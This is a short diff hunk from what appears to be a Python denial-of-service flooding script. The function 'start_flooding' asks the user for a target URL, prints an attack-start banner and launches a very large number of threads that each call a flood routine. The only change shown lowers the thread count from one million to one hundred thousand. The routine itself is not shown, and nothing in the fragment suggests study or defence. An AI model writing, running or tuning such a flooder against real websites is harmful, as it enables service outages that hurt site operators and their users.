@@ -71,7 +71,7 @@ def start_flooding():
     target_url = input("[+] ⚔️  TARGET URL ⚔️  : ")
     print("[+] ATTACK START...💣")
     
-    for i in range(1000000): 
+    for i in range(100000): 
         thread = threading.Thread(target=flood, args=(target_url,))
         thread.start()
 
